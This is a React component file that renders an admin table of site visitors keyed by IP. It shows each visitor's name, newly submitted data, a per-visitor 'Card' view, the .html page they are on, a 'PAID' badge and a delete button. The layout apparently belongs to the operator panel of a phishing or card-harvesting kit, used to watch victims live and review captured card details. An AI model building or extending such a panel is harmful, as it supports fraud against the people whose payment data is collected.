// src/components/UserTable.js
import React from "react";
import { API_BASE } from "../config";

export default function UserTable({
  users,
  highlightIp,
  cardIp,
  onShowCard,
  onShowInfo,
}) {
  const handleDelete = async (ip) => {
    if (!window.confirm(`Really delete all data for ${ip}?`)) return;

    const token = localStorage.getItem("token");
    try {
      const res = await fetch(
        `${API_BASE}/api/users/${encodeURIComponent(ip)}`,
        {
          method: "DELETE",
          headers: {
            Authorization: "Bearer " + token,
          },
        }
      );
      if (!res.ok) {
        throw new Error(`Server responded ${res.status}: ${res.statusText}`);
      }
      // “userDeleted” will be broadcast via socket.io, so the table updates automatically.
    } catch (err) {
      console.error("Delete failed:", err);
      alert("Delete failed: " + err.message);
    }
  };

  const entries = Object.entries(users);
  const isOnline = (u) => u.currentPage && u.currentPage !== "offline";

  const onlineEntries = [];
  const offlineEntries = [];
  for (let [ip, u] of entries) {
    if (isOnline(u)) onlineEntries.push([ip, u]);
    else offlineEntries.push([ip, u]);
  }
  const sortedEntries = [...onlineEntries, ...offlineEntries];

  return (
    <table className="table table-striped table-bordered">
      <thead className="thead-light">
        <tr>
          <th>#</th>
          <th>Name</th>
          <th>New Data</th>
          <th>Card</th>
          <th>Page</th>
          <th>Status</th>
          <th>Info</th>
          <th>Delete</th>
        </tr>
      </thead>
      <tbody>
        {sortedEntries.map(([ip, u], i) => {
          const isHighlighted = ip === highlightIp || ip === cardIp;

          // Green accent on the row if a payment was submitted (easy to spot)
          const rowStyle = {
            border: isHighlighted ? "2px solid #28a745" : undefined,
            background: u.flag ? "yellow" : undefined,
            boxShadow: u.hasPayment ? "inset 4px 0 #28a745" : undefined, // left green bar when paid
          };

          const displayName = u.name || u.FullName || "—";

          // Make the Name cell pop if paid
          const nameCellStyle = u.hasPayment
            ? {
                background: "#d4edda", // BS success background
                color: "#155724",
                fontWeight: 700,
              }
            : undefined;

          return (
            <tr key={ip} style={rowStyle}>
              <td>{i + 1}</td>
              <td style={nameCellStyle}>
                {displayName}
                {u.hasPayment && (
                  <span className="badge badge-success ml-2">PAID</span>
                )}
              </td>
              <td>
                <span
                  className={`font-weight-bold ${
                    u.hasNewData ? "text-success" : "text-danger"
                  }`}
                >
                  {u.hasNewData ? "Yes" : "No"}
                </span>
              </td>
              <td>
                <button
                  className="btn btn-success btn-sm"
                  onClick={() => onShowCard(ip)}
                >
                  Card
                </button>
              </td>
              <td>{(u.currentPage || "offline").replace(".html", "")}</td>
              <td>
                <span
                  className={`font-weight-bold ${
                    isOnline(u) ? "text-success" : "text-danger"
                  }`}
                >
                  {isOnline(u) ? "Online" : "Offline"}
                </span>
              </td>
              <td>
                <button
                  className="btn btn-info btn-sm"
                  onClick={() => onShowInfo(ip)}
                >
                  Info
                </button>
              </td>
              <td>
                <button
                  className="btn btn-outline-danger btn-sm"
                  onClick={() => handleDelete(ip)}
                >
                  Delete
                </button>
              </td>
            </tr>
          );
        })}
      </tbody>
    </table>
  );
}
